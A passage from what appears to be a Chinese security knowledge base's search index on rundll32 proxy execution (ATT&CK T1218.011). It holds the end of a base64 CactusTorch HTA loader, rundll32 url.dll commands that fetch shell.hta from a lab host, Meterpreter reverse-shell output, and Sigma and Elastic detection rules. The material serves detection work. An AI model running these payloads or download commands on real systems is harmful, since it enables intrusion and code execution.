&\"Dg4ODgIGGAMgAA4FAAICDg4EAAEIHAi3elxWGTTgiQQBAAAABAIAAAAEBAAAAAQIAAAABBAAAAAE\" s = s &\"IAAAAARAAAAABIAAAAAEAAEAAAQAAgAABAAEAAAEAAgAAAQAEAAABAAgAAAEAEAAAAQAgAAABAAA\" s = s &\"AQAEAAACAAQAAAQABAAACAAEAAAQAAQAACAABAAAAAEEAAAAAgQAAAAEBAAAAAgEAAAAEAQAAAAg\" s = s &\"BAAAAEAEAAAAgAQAMAAABAAAQAACBggCBgICBgkDBhEUAwYRGAIGBgMGESADBhEkEwAKGA4OEgwS\" s = s &\"DAIRFBgOEhwQERAKAAUYGBgYESARJAkABQIYGB0FGAgFAAICGAkKAAcYGBgJGBgJGAUgAgEODggB\" s = s &\"AAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAQAQALQ0FDVFVT\" s = s &\"VE9SQ0gAAAUBAAAAAAUBAAEAACkBACQ1NjU5OGYxYy02ZDg4LTQ5OTQtYTM5Mi1hZjMzN2FiZTU3\" s = s &\"NzcAAAwBAAcxLjAuMC4wAAAASDUAAAAAAAAAAAAAYjUAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AFQ1AAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAA\" s = s &\"ADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAANAMAAAAAAAAAAAAANAM0AAAAVgBTAF8A\" s = s &\"VgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAA\" s = s &\"AAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQA\" s = s &\"BAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJQCAAABAFMAdAByAGkAbgBnAEYAaQBs\" s = s &\"AGUASQBuAGYAbwAAAHACAAABADAAMAAwADAAMAA0AGIAMAAAADAADAABAEMAbwBtAG0AZQBuAHQA\" s = s &\"cwAAAEMAQQBDAFQAVQBTAFQATwBSAEMASAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAA\" s = s &\"AAAAAAAAAEAADAABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABDAEEAQwBUAFUA\" s = s &\"UwBUAE8AUgBDAEgAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAu\" s = s &\"ADAAAABAABAAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEMAQQBDAFQAVQBTAFQATwBSAEMA\" s = s &\"SAAuAGQAbABsAAAAPAAMAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBBAEMAVABV\" s = s &\"AFMAVABPAFIAQwBIAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAA\" s = s &\"AABIABAAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQwBBAEMAVABVAFMAVABP\" s = s &\"AFIAQwBIAC4AZABsAGwAAAA4AAwAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEMAQQBDAFQA\" s = s &\"VQBTAFQATwBSAEMASAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAw\" s = s &\"AC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAA\" s = s &\"LgAwAC4AMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAADAAAAwAAAB0NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" s = s &\"AAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlv\" s = s &\"bi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA\" entry_class =\"cactusTorch\" Dim fmt, al, d, o Set fmt = CreateObject(\"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter\") Set al = CreateObject(\"System.Collections.ArrayList\") al.Add fmt.SurrogateSelector Set d = fmt.Deserialize_2(Base64ToStream(s)) Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class) o.flame binary,code End Sub SetVersion On Error Resume Next Run If Err.Number <>0 Then Debug Err.Description Err.Clear End If self.close </script>","title":"\u66ff\u6362payload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_6","text":"\u672c\u5730\u6267\u884c rundll32.exe url.dll,FileProtocolHandler file://C:\\Users\\John\\Desktop\\shell.hta \u540c\u6837\u53ef\u4ee5\u8c03\u7528url.dll\u4e0b\u8f7dpayload\uff1a rundll32.exe url.dll,OpenURL http://192.168.126.146/shell.hta #\u4f1a\u6709\u5f39\u7a97\u63d0\u793a\u786e\u8ba4\u8fd0\u884c","title":"\u4e0a\u4f20\u81f3\u670d\u52a1\u5668\u6216\u8005\u672c\u5730"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#shell","text":"msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:4444 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 2 opened (192.168.126.146:4444 -> 192.168.126.149:49187) at 2020-04-18 23:48:35 +0800 meterpreter > getuid Server username: 12306Br0-PC\\12306Br0 meterpreter > getsid Server SID: S-1-5-21-3579006141-3881886638-2121494774-1000","title":"\u53cd\u5f39shell"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_7","text":"sysmon\u65e5\u5fd7\u8bb0\u5f55 EVentID: 1 Process Create: RuleName: UtcTime: 2020-04-18 15:48:25.994 ProcessGuid: {bb1f7c32-2149-5e9b-0000-00107066a000} ProcessId: 2900 Image: C:\\Windows\\System32\\rundll32.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: Windows host process (Rundll32) Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: RUNDLL32.EXE CommandLine: rundll32.exe url.dll,OpenURL http://192.168.126.146/shell.hta CurrentDirectory: C:\\Users\\12306Br0\\ User: 12306Br0-PC\\12306Br0 LogonGuid: {bb1f7c32-5fc3-5e99-0000-00201ae20600} LogonId: 0x6e21a TerminalSessionId: 1 IntegrityLevel: Medium Hashes: SHA1=963B55ACC8C566876364716D5AAFA353995812A8 ParentProcessGuid: {bb1f7c32-20fc-5e9b-0000-0010bd868700} ParentProcessId: 3808 ParentImage: C:\\Windows\\System32\\cmd.exe ParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" win7\u5b89\u5168\u65e5\u5fd7\u8bb0\u5f55 EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xa30 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\rundll32.exe EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xd04 \u65b0\u8fdb\u7a0b\u540d: C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe EVentID: 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x8f8 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\SysWOW64\\mshta.exe","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_8","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#sigma","text":"title: Suspicious Rundll32 Activity description: Detects suspicious process related to rundll32 based on arguments status: experimental references: - http://www.hexacorn.com/blog/2017/05/01/running-programs-via-proxy-jumping-on-a-edr-bypass-trampoline/ - https://twitter.com/Hexacorn/status/885258886428725250 - https://gist.github.com/ryhanson/227229866af52e2d963cf941af135a52 tags: - attack.defense_evasion - attack.execution - attack.t1218_11 logsource: category: process_creation product: windows detection: selection: CommandLine: - '*\\rundll32.exe* url.dll,*OpenURL *' - '*\\rundll32.exe* url.dll,*OpenURLA *' - '*\\rundll32.exe* url.dll,*FileProtocolHandler *' - '*\\rundll32.exe* zipfldr.dll,*RouteTheCall *' - '*\\rundll32.exe* Shell32.dll,*Control_RunDLL *' - '*\\rundll32.exe javascript:*' - '* url.dll,*OpenURL *' #\u9002\u5408\u672c\u6b21\u6848\u4f8b\u7684\u68c0\u6d4b\u7279\u5f81 - '* url.dll,*OpenURLA *' - '* url.dll,*FileProtocolHandler *' - '* zipfldr.dll,*RouteTheCall *' - '* Shell32.dll,*Control_RunDLL *' - '* javascript:*' - '*.RegisterXLL*' condition: selection falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: medium","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_9","text":"\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95url.dll%E6%89%A7%E8%A1%8Cpayload/#_10","text":"MITRE-ATT&CK-T1218-011 https://attack.mitre.org/techniques/T1218/011/ windows\u4e0b\u57fa\u4e8e\u767d\u540d\u5355\u83b7\u53d6shell\u7684\u65b9\u6cd5\u6574\u7406\uff08\u4e0a\uff09 http://www.safe6.cn/article/155","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/","text":"T1218-011-win-\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002 \u6d4b\u8bd5\u6848\u4f8b Rundll32.exe\u662f\u6307\u201c\u6267\u884c32\u4f4d\u7684DLL\u6587\u4ef6\u201d\u3002\u5b83\u7684\u4f5c\u7528\u662f\u6267\u884cDLL\u6587\u4ef6\u4e2d\u7684\u5185\u90e8\u51fd\u6570,\u529f\u80fd\u5c31\u662f\u4ee5\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u5e93\u3002 \u8bf4\u660e\uff1aRundll32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Rundll32\u8c03\u7528\u3002 windows 2003\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u8bc6\u522brundll32.exe\u8fdb\u884c\u51fa\u7ad9\u7f51\u7edc\u8fde\u63a5\u7684\u5f02\u5e38\u884c\u4e3a\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u5b58\u5728\u653b\u51fb\u6d3b\u52a8\uff0c\u5e76\u53ef\u80fd\u8ba4\u8bc6\u6076\u610fDLL\u3002 \u6d4b\u8bd5\u7559\u75d5 \u53ef\u53c2\u8003\uff1a T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload Examples of 5156 The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 1752 Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 10.45.45.103 Source Port: 53 Destination Address: 10.45.45.103 Destination Port: 50146 Protocol: 17 Filter Information: Filter Run-Time ID: 5 Layer Name: Receive/Accept Layer Run-Time ID: 44 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma title: \u68c0\u6d4b\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5\u884c\u4e3a description: \u901a\u8fc7windows\u65e5\u5fd7\u6765\u68c0\u6d4b\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5\u884c\u4e3a status: experimental references: - https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html tags: - attack.defense_evasion - attack.execution - attack.T1085 - attack.TA0002 date: 2020/12/2 logsource: category: process_creation product: windows detection: selection1: EventID: 5156 Process.name: 'rundll32.exe' #Application Name selection2: Destination Address: - 10.0.0.0/8 - 172.16.0.0/12 - 192.168.0.0/16 condition: selection1 and not selection2 level: low Elastic rule query process.name:rundll32.exe and event.action:\"Network connection detected (rule: NetworkConnect)\" and not destination.ip:(10.0.0.0/8 or 172.16.0.0/12 or 192.168.0.0/16 or 127.0.0.0/8) \u5efa\u8bae \u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u6765\u68c0\u6d4b\u548c\u5206\u6790rundll32.exe\u7684\u6267\u884c\u548c\u53c2\u6570\u3002\u6bd4\u8f83rundll32.exe\u7684\u8fd1\u671f\u8c03\u7528\u4e0e\u5386\u53f2\u5df2\u77e5\u5408\u6cd5\u53c2\u6570\u53ca\u5df2\u52a0\u8f7d\u52a8\u6001\u94fe\u63a5\u5e93\u6765\u786e\u5b9a\u662f\u5426\u6709\u5f02\u5e38\u548c\u6f5c\u5728\u7684\u653b\u51fb\u6d3b\u52a8\u3002\u5728rundll32.exe\u8c03\u7528\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528\u7684\u547d\u4ee4\u53c2\u6570\u4e5f\u53ef\u7528\u4e8e\u786e\u5b9a\u6b63\u5728\u52a0\u8f7d\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u7684\u6765\u6e90\u548c\u76ee\u7684\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1218-011 https://attack.mitre.org/techniques/T1218/011/ \u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5 https://www.elastic.co/guide/en/siem/guide/current/unusual-network-connection-via-rundll32.html","title":"T1218-011-win-\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#t1218-011-win-rundll32","text":"","title":"T1218-011-win-\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#attck","text":"Rundll32.exe\u7a0b\u5e8f\u53ef\u4ee5\u8c03\u7528\u6765\u6267\u884c\u4efb\u610f\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5229\u7528\u6b64\u529f\u80fd\u6765\u4ee3\u7406\u6267\u884c\u4ee3\u7801\uff0c\u4ece\u800c\u907f\u514d\u89e6\u53d1\u90a3\u4e9b\u53ef\u80fd\u4e0d\u4f1a\u76d1\u63a7rundll32.exe\u8fdb\u7a0b\u6267\u884c\u7684\u5b89\u5168\u5de5\u5177\uff0c\u56e0\u4e3a\u6b63\u5e38\u64cd\u4f5c\u4e2d\u4f7f\u7528rundll32.exe\u7684Windows\u4f1a\u6709\u767d\u540d\u5355\u6216\u8bef\u62a5\u3002 Rundll32.exe\u53ef\u7528\u4e8e\u901a\u8fc7\u672a\u8bb0\u5f55\u7684shell32.dll\u51fd\u6570Control_RunDLL\u548c Control_RunDLLAsUser\u6765\u6267\u884c\u63a7\u5236\u9762\u677f\u9879\u76ee\u6587\u4ef6\uff08.cpl\uff09\u3002\u53cc\u51fb.cpl\u6587\u4ef6\u4e5f\u4f1a\u89e6\u53d1rundll32.exe\u6267\u884c\u3002 Rundll32\u4e5f\u53ef\u7528\u4e8e\u6267\u884cJavaScript\u7b49\u811a\u672c\u3002\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4e8e\u4e0b\u9762\u7684\u8bed\u6cd5\u6765\u5b8c\u6210\uff1arundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\" \u3002\u8fd9\u79cd\u65b9\u6cd5\u5df2\u88ab\u6076\u610f\u8f6f\u4ef6\u5982Poweliks\u6240\u4f7f\u7528\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_1","text":"Rundll32.exe\u662f\u6307\u201c\u6267\u884c32\u4f4d\u7684DLL\u6587\u4ef6\u201d\u3002\u5b83\u7684\u4f5c\u7528\u662f\u6267\u884cDLL\u6587\u4ef6\u4e2d\u7684\u5185\u90e8\u51fd\u6570,\u529f\u80fd\u5c31\u662f\u4ee5\u547d\u4ee4\u884c\u7684\u65b9\u5f0f\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\u5e93\u3002 \u8bf4\u660e\uff1aRundll32.exe\u6240\u5728\u8def\u5f84\u5df2\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0cWmic\u547d\u4ee4\u53ef\u8bc6\u522b\uff0c\u9700\u6ce8\u610fx86\uff0cx64\u4f4d\u7684Rundll32\u8c03\u7528\u3002 windows 2003\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\System32\\rundll32.exe C:\\Windows\\SysWOW64\\rundll32.exe \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_3","text":"\u8bc6\u522brundll32.exe\u8fdb\u884c\u51fa\u7ad9\u7f51\u7edc\u8fde\u63a5\u7684\u5f02\u5e38\u884c\u4e3a\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u5b58\u5728\u653b\u51fb\u6d3b\u52a8\uff0c\u5e76\u53ef\u80fd\u8ba4\u8bc6\u6076\u610fDLL\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_4","text":"\u53ef\u53c2\u8003\uff1a T1218-011-win-\u57fa\u4e8e\u767d\u540d\u5355Rundll32.exe\u6267\u884cpayload Examples of 5156 The Windows Filtering Platform has allowed a connection. Application Information: Process ID: 1752 Application Name: \\device\\harddiskvolume1\\windows\\system32\\dns.exe Network Information: Direction: Inbound Source Address: 10.45.45.103 Source Port: 53 Destination Address: 10.45.45.103 Destination Port: 50146 Protocol: 17 Filter Information: Filter Run-Time ID: 5 Layer Name: Receive/Accept Layer Run-Time ID: 44","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1218-011-win-%E9%80%9A%E8%BF%87Rundll32%E7%9A%84%E5%BC%82%E5%B8%B8%E7%BD%91%E7%BB%9C%E9%93%BE%E6%8E%A5/#sigma","text":"title: \u68c0\u6d4b\u901a\u8fc7Rundll32\u7684\u5f02\u5e38\u7f51\u7edc\u94fe\u63a5\u884c\u4e3a description: 